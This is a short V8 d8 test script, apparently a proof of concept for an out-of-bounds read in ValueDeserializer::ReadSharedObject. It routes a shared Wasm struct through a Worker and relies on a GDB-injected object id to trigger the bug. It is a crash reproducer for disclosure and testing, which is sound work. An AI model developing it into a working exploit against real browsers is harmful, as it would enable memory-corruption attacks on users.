// CVE-candidate: ValueDeserializer::ReadSharedObject OOB
// value-serializer.cc:2686  no HasPersisted() check before GetPersisted()
// Flags: --wasm-shared --allow-natives-syntax

d8.file.execute("test/mjsunit/wasm/wasm-module-builder.js");

const b = new WasmModuleBuilder();
const si = b.addStruct({fields: [makeField(kWasmI32, true)], shared: true});
b.addFunction("make", makeSig([kWasmI32], [wasmRefType(si)]))
 .addBody([kExprLocalGet, 0, kGCPrefix, kExprStructNew, si]).exportFunc();
const inst = b.instantiate();
const s = inst.exports.make(1337);

// Worker round-trip → triggers WriteSharedObject (sender) + ReadSharedObject (receiver)
// GDB intercepts ReadSharedObject and changes id: 0 → 0xFFFF
const w = new Worker(() => { onmessage = ({data}) => postMessage(data); },
                     {type:'function'});
w.postMessage(s);
w.getMessage();     // ← ReadSharedObject called here; GDB injects OOB id
print("[DONE] if no crash: GDB injection missed");
